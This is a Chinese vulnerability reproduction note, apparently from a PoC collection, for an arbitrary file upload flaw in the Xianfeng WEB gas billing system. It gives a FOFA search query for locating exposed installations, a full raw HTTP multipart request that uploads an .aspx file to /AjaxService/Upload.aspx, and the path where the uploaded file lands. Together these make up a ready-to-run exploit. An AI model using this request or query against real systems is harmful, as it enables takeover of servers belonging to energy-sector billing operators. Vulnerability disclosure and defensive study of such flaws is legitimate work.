# 先锋WEB燃气收费系统AjaxService存在任意文件上传漏洞

# 一、漏洞简介
先锋WEB燃气收费系统是由杭州先锋电子技术股份有限公司开发的一款服务于能源行业的系统，先锋WEB燃气收费系统存在文件上传漏洞，可导致攻击者获取服务器权限。

# 二、影响版本
+ 先锋WEB燃气收费系统

# 三、资产测绘
+ fofa`app="先锋WEB燃气收费系统"`
+ 特征

![1704874235704-3e56b6a3-908c-40ed-b95e-56d707535373.png](./img/HdzFuW3QJddJoKxY/1704874235704-3e56b6a3-908c-40ed-b95e-56d707535373-574124.png)

# 四、漏洞复现
```java
POST /AjaxService/Upload.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------38002115147665341923847377752
Content-Length: 710
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="Fdata"; filename="1ndex.aspx"
Content-Type: text/html


123
-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="submit"

Submin
-----------------------------38002115147665341923847377752--
```

![1704874299499-1f95c955-e080-4a8a-b9ae-cc15ac11c5e2.png](./img/HdzFuW3QJddJoKxY/1704874299499-1f95c955-e080-4a8a-b9ae-cc15ac11c5e2-839949.png)

上传文件位置

```java
/UploadFile/202401/2024011004110066.aspx
```

![1704874346773-47fd980d-4198-4d87-b60b-20d20660ccd4.png](./img/HdzFuW3QJddJoKxY/1704874346773-47fd980d-4198-4d87-b60b-20d20660ccd4-793587.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sra2po2of1g77mo7>